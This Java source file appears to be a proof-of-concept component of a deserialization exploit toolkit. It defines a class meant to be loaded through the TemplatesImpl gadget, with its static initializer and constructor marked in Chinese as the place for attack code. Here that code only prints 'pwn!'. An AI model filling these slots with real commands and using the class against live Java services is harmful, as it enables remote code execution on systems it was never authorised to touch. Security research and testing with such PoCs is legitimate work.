package ExpUtils;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/*
* 供TemplatesImpl 使用的poc代码
* */
public class TemplatesEvilClass extends AbstractTranslet {
    static {
//        攻击代码
        System.out.println("static : pwn!");
    }

    public TemplatesEvilClass(){
//        攻击代码
        System.out.println("pwn!");
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

}
